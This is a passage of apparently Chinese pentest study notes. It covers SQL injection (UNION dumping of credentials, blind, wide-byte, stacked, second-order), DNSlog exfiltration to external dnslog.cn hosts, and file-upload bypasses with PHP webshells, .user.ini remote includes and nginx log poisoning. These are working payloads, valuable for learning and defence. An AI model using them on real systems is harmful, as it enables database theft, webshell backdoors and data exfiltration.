class=&#34;language-bash&#34;&gt;猜字段有多少个， 1 时是正确的， 1 、 2 时报错了，说明只能爆出来一个字段&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http://192.168.31.208/history.php?user=admin%27%20union%20select%201--+&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http://192.168.31.208/history.php?user=admin%27%20union%20select%201,2--+&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;爆出数据库的名字，当前数据库名显示为数据库名是 &lt;span class=&#34;built_in&#34;&gt;users&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http://192.168.31.208/history.php?user=admin\&amp;#x27; union select database()--+&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;显示有四个数据库 information_schema,mysql,performance_schema,sys,&lt;span class=&#34;built_in&#34;&gt;users&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http://192.168.31.208/history.php?user=admin%27%20union%20select%20group_concat(schema_name)%20from%20information_schema.schemata--+&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;显示数据库 &lt;span class=&#34;built_in&#34;&gt;users&lt;/span&gt; 下有两个表: details,&lt;span class=&#34;built_in&#34;&gt;log&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http://192.168.31.208/history.php?user=admin%27%20union%20select%20group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=%27users%27--+group_concat(table_name) from information_schema.tables where table_schema=&amp;#x27;users&amp;#x27;--+&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;显示数据库&lt;span class=&#34;built_in&#34;&gt;users&lt;/span&gt;中表detail 有两列:name，password&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http://192.168.31.208/history.php?user=admin%27%20union%20select%20group_concat(column_name)%20from%20information_schema.columns%20where%20table_name=%27details%27--+group_concat(column_name) from information_schema.columns where table_name=&amp;#x27;details&amp;#x27;--+&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;显示users.detail 中 name 分别是:admin,admin123,john,&lt;span class=&#34;built_in&#34;&gt;test&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http://192.168.31.208/history.php?user=admin%27%20union%20select%20group_concat(name)%20from%20users.details--+group_concat(name) from users.details--+&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;得到 users.detail 中 password 的值:&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http://192.168.31.208/history.php?user=admin%27%20union%20select%20group_concat(password)%20from%20users.details--+group_concat(password) from users.details--+&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h4 id=&#34;sql-三大盲注&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#sql-三大盲注&#34;&gt;#&lt;/a&gt; sql 三大盲注&lt;/h4&gt;
&lt;p&gt;盲注就是在注入过程中，获取的数据不能回显至前端页面。此时，我们需要利用一些方法进行判断或者尝试，这个过程称之为盲注。&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;布尔盲注：有数据库输出判断标准&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;left(database(),1)&amp;gt;&amp;#x27;s&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;select user() regexp&amp;#x27;^r&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;select user() like&amp;#x27;^ro%&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ascii(substr((select database()),1,1))&amp;lt;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ord(mid((select user()),1,1))=&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;报错注入：有数据库报错处理判断标准&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;floor(rand(0)*2))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;extractvalue(1,concat(0x7e,(select user()),0x7e));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;select updatexml(1,concat(0x7e,(select user()),0x7e),1);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;时间盲注：都不需要，比较好用&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;if(left(user(),1)=&amp;#x27;a&amp;#x27;,0,sleep(3));&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;ul&gt;
&lt;li&gt;盲注中的相关函数的解释&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;like &amp;#x27;ro%&amp;#x27; #判断ro或ro...是否成立&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;regexp &amp;#x27;^xiaodi[a-z]&amp;#x27; #匹配xiaodi及xiaodi...等&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;if (条件,5,0) #条件成立 返回 5 反之 返回 0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sleep(5) #SQL语句延时执行 5 秒&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;mid(a,b,c) #从位置b开始，截取a字符串的c位&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;substr(a,b,c) #从位置b开始，截取字符串a的c长度&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;left(database(),1)，database() #left(a,b)从左侧截取a的前b位&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;length(database())=8 #判断数据库database()名的长度&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ord=ascii ascii(x)=97 #判断x的ascii码是否等于 97&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;ul&gt;
&lt;li&gt;盲注漏洞寻找：特定函数 + 功能点&lt;br&gt;
 insert/update/delete 无回显，手工测功能点（会员中心 / 删除新闻 / 修改文章 / 留言），注意闭合前面和后面的部分，构造 payload，找到注入点配合工具脚本。代码会带入到数据库中执行，仅保证数据能够执行但没有回显，需要用盲注的方式爆出数据库数据。&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;宽字节注入&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#宽字节注入&#34;&gt;#&lt;/a&gt; 宽字节注入&lt;/h4&gt;
&lt;p&gt;自动加上一个转义符号，会导致注入语句失效，使用宽字节绕过。&lt;/p&gt;
&lt;p&gt;在计算机中每一个字符为 8 位，那么就是 1 个字节，宽字节注入就是两个字节合并从而进行绕过，如 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzEyNy4wLjAuMS93aGVyZS5waHA/aWQ9MQ==&#34;&gt;http://127.0.0.1/where.php?id=1&lt;/span&gt;’ 当我们输入单引号的时候，那么会被转义成’，这样就无法进行注入。&lt;/p&gt;
&lt;p&gt;但是进行绕过的话，在 id 参数加入一个 % df 被转义后成为 % df%5c 那么就会成为一个繁体字。&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzEyNy4wLjAuMS93aGVyZS5waHA/aWQ9JWRm&#34;&gt;http://127.0.0.1/where.php?id=�&lt;/span&gt;’ (運’) 这样会被转义，但是这是宽字节，所以即使被转义后也可以进行注入。之后就用 sqlmap 跑即可。&lt;/p&gt;
&lt;h4 id=&#34;堆叠注入&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#堆叠注入&#34;&gt;#&lt;/a&gt; 堆叠注入&lt;/h4&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;将一堆sql语句叠加后执行，用分号结束上一个语句再叠加其他语句一起执行。在数据库中可以用拼接的语句来实现效果：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;select * from users where id=1;create table test like users;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;select * from users where id=1;drop table test;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;select * from users where id=1;select 1,2,3;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;select * from users where id=1;insert into users(id,username,password) values (&amp;#x27;100&amp;#x27;,&amp;#x27;new&amp;#x27;,&amp;#x27;new&amp;#x27;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;如果selcet/insert/update/delete被过滤，可以采用编码的方式绕过：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;PREPARE yuchuli from &amp;#x27;select * from `1919810931114514`&amp;#x27;; EXECUTE yuchuli;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#x27;;SET @sql = concat(char(115,101,108,101,99,116), &amp;quot; * from `1919810931114514`&amp;quot;); PREPARE yuchuli from @sql; EXECUTE yuchuli;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#x27;;SET @a=0x73656c656374202a2066726f6d20603139313938313039333131313435313460;PREPARE execsql from @a;EXECUTE execsql;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h4 id=&#34;二次注入&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#二次注入&#34;&gt;#&lt;/a&gt; 二次注入&lt;/h4&gt;
&lt;p&gt;进行数据库插入数据时，对其中的特殊字符进行了转义处理，在写入数据库的时候又保留了原来的数据。开发者默认存入数据库的数据都是安全的，在进行查询时，直接从数据库中取出恶意数据，没有进行进一步的检验的处理。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;可以在注册处注册一个恶意数据&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;注册一个 admin’# 的账号，登陆该账号后可以进行密码修改。当数据写入到数据库的时候反斜杠会被移除，所以写入到数据库的内容就是原始数据，并不会在前面多了反 斜杠。用 admin’# 登陆，并进行密码修改，密码修改为 123456。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;此时原来 admin 的密码被改变为 123456。因为我们将问题数据存储到了数据库，而程序再取数据库中的数据时没有进行二次判断便直接带入到代码中，从而造成了二次注 入。&lt;/strong&gt;&lt;/p&gt;
&lt;h4 id=&#34;dnslog注入&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#dnslog注入&#34;&gt;#&lt;/a&gt; dnslog 注入&lt;/h4&gt;
&lt;p&gt;域名可以分为 5 级，从右向左解析，用’.&#39; 分割级别，低级别的域名要在高级别的域名中去解析，所以当 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3NlY3VyaXR5LmdpdHc3Yy5kbnNsb2cuY24=&#34;&gt;security.gitw7c.dnslog.cn&lt;/span&gt; 去 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL2dpdHc3Yy5kbnNsb2cuY24=&#34;&gt;gitw7c.dnslog.cn&lt;/span&gt; 中去解 析的时候，就会留下解析记录，通过获取前来解析的低级域名前缀来获取我们需要的信息。&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;dnslog 注入使用&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;select load_file(concat(&amp;#x27;\\\\&amp;#x27;,(select database()),&amp;#x27;.gitw7c.dnslog.cn/abc&amp;#x27;));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;//转换之后的结果为:\\security.gitw7c.dnslog.cn&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;load_file请求security.gitw7c.dnslog.cn下的/abc文件时留下dns解析记录来获取信息的。&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;ul&gt;
&lt;li&gt;域名解析规则与 mysql 解析 url 的问题&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;域名里有一个规则，只能出现数字，字母，下划线；所以在获取到的信息中包含了其&lt;br&gt;
他特殊符号时，load_file 就会认为是一个错误的域名，就不会去从网络中解析了。当数据 库名为 security，以字母开头，在域名规则内是允许的，load_file 会向域名进行解析。而当 在域名中拼接一个 @符号时，就不会进行解析。&lt;/p&gt;
&lt;p&gt;在使用 group_concat 合并查询时，会自动使用’,‘连接我们查询到的每值，但是由于’,’ 在 url 中是不允许出现的，所以使用 group 查询到的值去解析时候，mysql 就会认为这不是一 个 url 地址，就不会出现解析的操作，所以就没法获取到值。&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;使用replace，substr等函数，可以绕过url解析的问题。如：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;select load_file(concat(&amp;#x27;\\\\&amp;#x27;,(select SUBSTR(replace((group_concat(username )),&amp;#x27;,&amp;#x27;,&amp;#x27;_&amp;#x27;),1,63) from users),&amp;#x27;.qnpqsu.dnslog.cn/abc&amp;#x27;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;通过正则替换将replace中的&lt;span class=&#34;string&#34;&gt;&amp;quot;,&amp;quot;&lt;/span&gt;全部替换为&lt;span class=&#34;string&#34;&gt;&amp;quot;_&amp;quot;&lt;/span&gt;后符合了url的解析规则，并且需要将查询结果的字符长度控制在 63 个之内。&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;strong&gt;dnslog 还可以解决命令注入无回显的问题，在有命令执行的地方尝试执行命令：curl 得到的 dnslog 子域名，如果执行成功则在 dnslog.cn 上会有回显。dns 协议一般不会被禁用或被防火墙拦截，是可以出网的。&lt;/strong&gt;&lt;/p&gt;
&lt;h3 id=&#34;文件上传&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#文件上传&#34;&gt;#&lt;/a&gt; 文件上传&lt;/h3&gt;
&lt;h4 id=&#34;常见绕过方法&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#常见绕过方法&#34;&gt;#&lt;/a&gt; 常见绕过方法&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;前端 js 认证：可修改数据包将 jpg/png 改为 php&lt;/li&gt;
&lt;li&gt;MIME 绕过：抓包修改 content-type 为图片类型 image/jpeg、image/png、image/gif&lt;/li&gt;
&lt;li&gt;点 + 空格 + 点 / 大小写 / 空格绕过：伪造为’1.php. .&#39; 或’1.pHP’或’1.php ’&lt;/li&gt;
&lt;li&gt;文件头部信息绕过：不同格式后缀的图片用编辑器打开之后头几个字母不同，通过伪造&lt;/li&gt;
&lt;li&gt;文件的头部信息绕过文件类型校验，如 gif 的头部是 GIF89A&lt;/li&gt;
&lt;li&gt;.htaccess 绕过：apache 中间件可上传内容为 AddType application/x-httpd-php .png&lt;/li&gt;
&lt;li&gt;的.htaccess 文件，使 png 后缀文件当成 php 解析，nginx 中间件需要相关配置才会支持&lt;/li&gt;
&lt;li&gt;二次渲染绕过：在未被删掉代码的图片源代码中添加后门上传，如果对方服务器返回了&lt;/li&gt;
&lt;li&gt;文件的地址如 http://127.0.0.1/images/?image=1.png 的文件包含形式，则可能执行后门&lt;/li&gt;
&lt;li&gt;二次渲染：图片上传之后被做了修改，遗留下了被裁剪后的图片，图片源代码有所减少&lt;/li&gt;
&lt;li&gt;二次渲染配合条件竞争：文件到了服务器才进行的过滤是存在二次渲染问题的，配合条件竞争可以实现后门写入，文件存在的那一刹那，对文件进行重复访问，此时文件不会被重命名，php 文件留下来了；二次渲染一般用脚本生成图片，手工生成不容易判断哪里的代码会被消除&lt;/li&gt;
&lt;li&gt;图片中的后门代码被执行需要配合解析漏洞、文件包含、.user.ini 或.htaccess 四者之一&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;userini-巧用&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#userini-巧用&#34;&gt;#&lt;/a&gt; .user.ini 巧用&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;.user.ini 绕过：上传内容为 auto_prepend_file=test.png 的.user.ini 文件；并上传内容为 &lt;?php eval($_POST[x]);?&gt;的 test.png，访问 index.php 时则执行 test.png 中的后门&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;点过滤绕过：上传内容为 &amp;lt;?=include’&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzc5NDc1MDA2OS8=&#34;&gt;http://794750069/&lt;/span&gt;’&amp;gt; 的 xxx 文件，此地址的首页源 代码上写上后门代码，并上传 auto_prepend_file=xxx 的.user.ini 文件，则可触发后门&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;文件上传即删除绕过：上传内容为 auto_prepend_file=http://794750069 / 的.user.ini 文 件，此时访问 index.php 就会被当作访问了存放在远程的后门文件&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;无 index.php 文件：没有首页文件并且过滤非常严谨，可以先上传任意内容的 index.php 文件，再上传内容为 auto_prepend_file=/var/log/nginx/access.log 的.user.ini 文 件，抓包并在 UA 中写入一句话后门则可以得到 webshell&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;*.user.ini 实际上就是一个可以由用户 “自定义” 的 php.ini，我们触发访问的的代码并不是.user.ini 也不是 1.png 而是 index.php，它有去让这个.user.ini 生效。我们访问 index.php, 会按照我们上传的.user.ini 去解析，解析了我们上传的包含恶意代码的 test.png 文件。&lt;/strong&gt;&lt;/p&gt;
&lt;h4 id=&#34;日志文件写木马&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#日志文件写木马&#34;&gt;#&lt;/a&gt; 日志文件写木马&lt;/h4&gt;
&lt;p&gt;&lt;strong&gt;nginx 的日志文件时 /var/log/nginx/access.log，可以通过修改.user.ini 的配置使 index.php 包含其 nginx 日志文件，此时访问 index.php 文件时将会定位到日志文件。日志文件中记录有 UA 头，伪造 UA 数据为一句话木马，此木马被记录到 日志，在 index.php 处执行木马文件即可获得 webshell。&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;上传.user.ini: auto_prepend_file=test.png&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;上传 test.png: &lt;?=include&#34;/var/lo&#34;.&#34;g/nginx/access.lo&#34;.&#34;g&#34;?&gt; 访问 index.php 文件则会出现 nginx 的日志文件&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;抓包伪造 UA: &lt;?=eval($_POST[x]);?&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;执行木马: x=system (‘tac …/flag.php’);&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;中间件-解析漏洞&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#中间件-解析漏洞&#34;&gt;#&lt;/a&gt; 中间件 解析漏洞&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;IIS 6 7 : 文件名 x.asp;.x.jpg、目录名 x.asp/x.jpg&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Apache 换行解析 配置不当: CVE-2017-15715，2.4.0~2.4.29 版本存在解 析漏洞；上传 evil.php 文件，在文件末尾添加空格，找到 hex 中的 20 修改为 0a，上传之后访问文件 /evil.php%0a 即可触发后门代码内容&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Apache htaccess 配置不当：AddHandler application/x-httpd-php .php，将 1.php.png 解析为 php&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;nginx 文件名逻辑：CVE-2013-4547 ,0.8.4 ~1.4.3 / 1.5.0~1.5.7 存在文件名逻辑 漏洞；上传内容为 &lt;?php phpinfo();?&gt; 的 “1.gif [0x20]” 文件，访问 /1.gif [0x20][0x00].php，即可发现 PHP 被解析&lt;br&gt;
 &lt;code&gt;[0x20]表示 hex 处的值是 20，对应可视化界面是一个空格&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;nginx nginx.conf 配置不当：该漏洞与 Nginx、php 版本无关，属于用户配置 不当造成的解析漏洞，上传 /nginx.png，访问 /nginx.png/.php 即可解析 png 为 php&lt;br&gt;
 &lt;code&gt;实战可以直接找到属于该中间件下的一个图片的原链接地址，后缀加/.php 测试是否执行&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;编辑器漏洞：如果能扫描到编译器目录，可以寻找是否存在相关历史漏洞&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
